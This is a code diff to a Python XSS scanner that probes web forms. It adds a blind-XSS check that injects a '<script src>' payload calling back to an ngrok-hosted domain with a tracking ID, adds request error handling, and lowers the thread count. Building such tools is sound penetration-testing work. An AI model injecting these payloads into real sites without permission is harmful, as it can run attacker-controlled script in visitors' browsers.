@@ -1,4 +1,4 @@
-import requests, json, time, os, concurrent.futures
+import requests, json, time, os, concurrent.futures, uuid
 from datetime import datetime
 from config import Config
 
@@ -6,6 +6,9 @@ session = None
 probe = """crucible'"><;"""
 
 DANGER_TAGS = ['<script', '<img', '<iframe', '<svg', '<a ']
+
+class Config:
+    BLIND_XSS_DOMAIN = "mutually-spiculate-kaka.ngrok-free.app"
 
 def looks_Real_Endpoint(form):
 
@@ -55,7 +58,14 @@ def send_Request(action, method, data, session = None):
         if method == 'post':
             return caller.post(action, data=data)
         return caller.get(action, params=data)
+    except requests.exceptions.Timeout:
+        print(f"[-] Request to {action} timed out.")
+        return None
     except requests.exceptions.RequestException:
+        print(f"[-] Unexpected error occurred while sending request to {action}")
+        return None
+    except Exception as e:
+        print(f"[-] Request to {action} failed: {e}")
         return None
     
 def check_Reflected_XSS(candidate):
@@ -95,6 +105,17 @@ def check_Reflected_XSS(candidate):
             
     return findings
 
+def check_blind_XSS(candidate):
+    
+    tracking_id = str(uuid.uuid4())[:8]
+    callback_url = f"https://{Config.BLIND_XSS_DOMAIN}/bxss/{tracking_id}"
+    
+    payload = f"<script src='{callback_url}'></script>"
+    print(f"  [>] Injecting Blind XSS | Tracking ID: {tracking_id}")
+    
+    data = prepare_Input_Data(candidate, payload)
+    send_Request(candidate['action'] , candidate['method'], data, session)
+
 def injector(forms, active_session):
 
     global session
@@ -105,7 +126,7 @@ def injector(forms, active_session):
     vulnerable_pages = []
     exploitable = []
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
 
         probe = {executor.submit(reflection,c): c for c in candidates}
 
